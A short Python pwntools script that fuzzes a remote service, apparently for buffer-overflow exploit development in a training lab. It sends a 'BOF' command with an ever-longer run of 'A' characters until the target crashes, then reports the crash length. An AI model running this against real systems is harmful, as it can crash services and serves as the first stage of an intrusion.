#!/usr/bin/env python3
# Fuzzer 

import time, sys
from pwn import *

rhost = "XXX.XXX.XXX.XXX"
rport = XXXX

buffer = "A" * 100

while True:
    try:
        log.info("Fuzzing " + str(len(buffer)) + " bytes ..")
        r = remote(rhost, rport, timeout=2)

        if r.recvline_startswith("Welcome "):
            log.info("Got Welcome")
            r.newline = "\r\n"
            r.send("BOF " + buffer)
            r.recv(1024,2)
            log.info("String sent")
            buffer = buffer + "A" * 100
            time.sleep(1)

        else:
            log.error("Unable to connect")	

    except Exception as e:
        log.error(f"Could not connect: {e}")
        log.error("Crashed at " + (str(len(buffer))) + " bytes")
        sys.exit(0)